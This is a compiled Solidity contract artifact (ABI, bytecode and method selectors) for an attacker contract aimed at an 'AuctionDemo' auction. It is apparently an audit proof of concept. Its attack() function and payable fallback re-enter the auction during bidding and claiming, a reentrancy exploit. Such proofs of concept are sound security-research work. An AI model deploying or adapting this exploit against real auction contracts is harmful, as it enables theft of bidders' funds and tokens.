{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract AuctionDemo",
          "name": "_auctionDemo",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "auctionDemo",
      "outputs": [
        {
          "internalType": "contract AuctionDemo",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "robinHood",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "setTokenId",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b506040516104c43803806104c483398101604081905261002f9161005d565b600180546001600160a01b039092166001600160a01b0319928316179055600080549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6104288061009c6000396000f3fe6080604052600436106100555760003560e01c8063150b7a02146100ba57806317d70f7c14610103578063492eaa87146101275780638bb127a01461015f5780639e5faafc1461017f578063c929ccf314610187575b600154600254604051635d5bc34760e01b81526001600160a01b0390921691635d5bc3479161008a9160040190815260200190565b600060405180830381600087803b1580156100a457600080fd5b505af11580156100b8573d6000803e3d6000fd5b005b3480156100c657600080fd5b506100e56100d53660046102fd565b630a85bd0160e11b949350505050565b6040516001600160e01b031990911681526020015b60405180910390f35b34801561010f57600080fd5b5061011960025481565b6040519081526020016100fa565b34801561013357600080fd5b50600054610147906001600160a01b031681565b6040516001600160a01b0390911681526020016100fa565b34801561016b57600080fd5b50600154610147906001600160a01b031681565b6100b86101a7565b34801561019357600080fd5b506100b86101a23660046103d9565b61026c565b6000546001600160a01b031633146102065760405162461bcd60e51b815260206004820152601e60248201527f536f7272792c206f6e6c7920726f62696e2063616c2063616c6c202d5f2d000060448201526064015b60405180910390fd5b60015460025460405163249a825160e21b815260048101919091526001600160a01b039091169063926a09449034906024016000604051808303818588803b15801561025157600080fd5b505af1158015610265573d6000803e3d6000fd5b5050505050565b6000546001600160a01b031633146102c65760405162461bcd60e51b815260206004820152601e60248201527f536f7272792c206f6e6c7920726f62696e2063616c2063616c6c202d5f2d000060448201526064016101fd565b600255565b80356001600160a01b03811681146102e257600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b6000806000806080858703121561031357600080fd5b61031c856102cb565b935061032a602086016102cb565b925060408501359150606085013567ffffffffffffffff8082111561034e57600080fd5b818701915087601f83011261036257600080fd5b813581811115610374576103746102e7565b604051601f8201601f19908116603f0116810190838211818310171561039c5761039c6102e7565b816040528281528a60208487010111156103b557600080fd5b82602086016020830137600060208483010152809550505050505092959194509250565b6000602082840312156103eb57600080fd5b503591905056fea26469706673582212200c9280b71a669e749cea7ecef89b88ea081c951fd56365ae43bef85b8a2f6a9564736f6c63430008150033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack()": "9e5faafc",
    "auctionDemo()": "8bb127a0",
    "onERC721Received(address,address,uint256,bytes)": "150b7a02",
    "robinHood()": "492eaa87",
    "setTokenId(uint256)": "c929ccf3",
    "tokenId()": "17d70f7c"
  },
  "id": 50
}